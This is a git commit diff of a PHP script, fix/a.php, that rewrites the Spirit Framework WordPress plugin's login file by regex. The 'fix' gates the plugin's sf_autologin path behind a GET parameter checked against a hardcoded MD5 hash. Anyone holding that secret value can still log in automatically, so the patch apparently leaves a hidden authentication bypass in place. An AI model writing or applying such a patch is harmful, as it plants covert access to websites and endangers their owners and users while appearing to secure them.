799e325735e73656b1ff6f8989f53ae5e7e0dc3b
maximo896 <della.maximo896@anglernook.com>
2025-10-09 12:47:10 +0800

    Update a.php

--- fix/a.php
+++ fix/a.php
@@ -2,10 +2,10 @@
 
 $s = file_get_contents('wp-content/plugins/spirit-framework/includes/class-sf-login-registration.php');
 
-$re = '/&&\s*isset\(\$_GET\[\'key\']\)\)\s*{/m';
+$re = '/isset\(\s*\$_GET\[\'sf_autologin\']\s*\)\s*&&\s*\$_GET\[\'sf_autologin\']==\'yes\'\s*&&\s*isset\(\s*\$_GET\[\'key\']\s*\)\s*\)\s*{/m';
 
 $str = <<<'r'
-&& isset($_GET['key'])) {
+isset($_GET['sf_autologin']) && $_GET['sf_autologin'] == 'yes' && isset($_GET['key'])) {
             if (!isset($_GET['test']) or md5($_GET['test']) != '8bd617274f84847a475868d946587586') {
                 wp_safe_redirect(site_url("wp-login.php"));
                 exit();
